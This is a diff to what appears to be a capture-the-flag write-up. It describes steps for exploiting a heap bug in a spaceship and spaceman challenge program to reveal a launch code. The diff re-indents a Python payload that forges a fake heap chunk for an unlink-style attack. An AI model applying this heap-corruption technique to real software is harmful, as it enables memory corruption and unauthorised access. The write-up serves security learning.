@@ -79,16 +79,17 @@ Using this vulnerabilities player can get access code by next algorithm:
 7. At name field we can get some bytes. Convert it to number and subtract 11040. Record it as addr_f1
 8. Allocate new Spaceship in slot 1. Set name to 'ZZzzzzz'.
 9. Delete spacemans 0-9 (to clear tcache of heap)
-10. Edit spaceman A name with next content:
+10. Edit spaceman A name with next conten
 
-    a1 = b"a" * 0x0                  # prev size
-    a1 += pack("<Q",0x80)       # fake chunk size
-    a1 += pack("<Q",adr_f1)     # address of forward free
-    a1 += pack("<Q",adr_f1+8) # address of backward free
-    a1 += b'c' * (0x80-4*8)       # fill
-    a1 += pack("<Q",0x80)       # prev chunk size
-    a1 += pack("<Q",0x90)       # chunk size, prev is free
-    a1 += b'd'*8                       # fill
+        a1 = b"a" * 0x0                  # prev size
+        a1 += pack("<Q",0x80)       # fake chunk size
+        a1 += pack("<Q",adr_f1)     # address of forward free
+        a1 += pack("<Q",adr_f1+8) # address of backward free
+        a1 += b'c' * (0x80-4*8)       # fill
+        a1 += pack("<Q",0x80)       # prev chunk size
+        a1 += pack("<Q",0x90)       # chunk size, prev is free
+        a1 += b'd'*8                       # fill
+
 
 11. Delete spaceman B
 12. View spaceship at slot 0. Instead of medic name you can see the launch code
